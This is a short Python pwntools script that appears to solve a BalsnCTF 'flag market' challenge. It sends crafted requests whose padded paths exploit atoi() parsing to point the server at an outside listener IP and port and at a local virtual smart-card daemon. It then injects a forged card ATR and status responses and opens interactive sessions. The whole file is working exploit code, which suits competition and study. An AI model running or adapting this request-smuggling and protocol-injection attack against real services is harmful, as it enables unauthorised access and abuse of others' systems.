#!/usr/bin/env python3
from pwn import *


def connect():
    return remote("flag-market-us.balsnctf.com", 34317)
    # return remote("localhost", 19091)


VPCDPORT = 35963
MAX_REQ_BUF = 1024
ATR = b"\x3B\xFC\x18\x00\x00\x81\x31\xFE\x45\x80\x73\xC8\x21\x13\x66\x02\x04\x03\x55\x00\x02\xD2"
LISTENER_HOST = "178.217.31.157"
LISTENER_PORT = 0x3A20


def edit(x, i, y):
    x[i : i + len(y)] = y


def edit_no_x00(x, i, y):
    assert b"\x00" not in y
    edit(x, i, y)


def main():
    with connect() as tube1:
        path = flat(
            {
                0: b"buy_flag",
                384: str(LISTENER_PORT).encode() + b".",
                384 * 2: LISTENER_HOST.encode(),
            }
        )
        tube1.send(b"BUY_FLAG /" + path + b" HTTP/1.1")
        with connect() as tube2:
            path = flat(
                {
                    384: str(VPCDPORT).encode() + b".",  # atoi()
                    384 * 2: b"127.0.0.1",
                }
            )
            req = bytearray(MAX_REQ_BUF)
            request_line = b"XX /" + path + b" HTTP/1.1\r\n"
            edit_no_x00(req, 0, request_line)
            edit_no_x00(req, 0, struct.pack(">H", len(request_line) - 2))
            edit(
                req,
                len(request_line),
                b"".join(
                    (
                        struct.pack(">H", len(ATR)) + ATR,
                        b"\x00\x02\x90\x00" * 2,
                    )
                ),
            )
            tube2.send(req)
            tube2.interactive()
        tube1.interactive()


if __name__ == "__main__":
    main()
